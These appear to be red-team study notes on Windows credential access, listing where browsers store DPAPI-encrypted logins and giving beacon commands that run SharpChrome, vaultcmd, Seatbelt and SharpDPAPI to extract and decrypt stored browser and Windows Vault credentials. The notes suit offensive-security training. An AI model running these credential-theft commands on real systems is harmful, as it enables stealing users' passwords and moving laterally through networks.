a tactic where an adversary attempts to steal the authentication material of users, often used for priv esc or lateral movement

credentials from web browsers:
  browsers typically encrypt credentials stored using windows data protection api (DPAPI)
  these databases are typically stored under %LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data
    e.g. %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
  if these databases are present, we may use tools such as SharpChrome.exe to extract the plain text creds
    beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins

windows credentials manager:
  additional creds that need to be stored may be stored here (such as RDP creds)
  the following commands can show the presence of stored creds:
    beacon> run vaultcmd /listcreds:"Windows Credentials" /all
    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
  to decrypt these creds we need to decrypt the key using the DPAPI key then use that key to decrypt the creds:
    beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
    NOTE: 'credentials' will search the saved creds, '/rpc' leverages the microsoft backup key remote protocol to get the DPAPI key

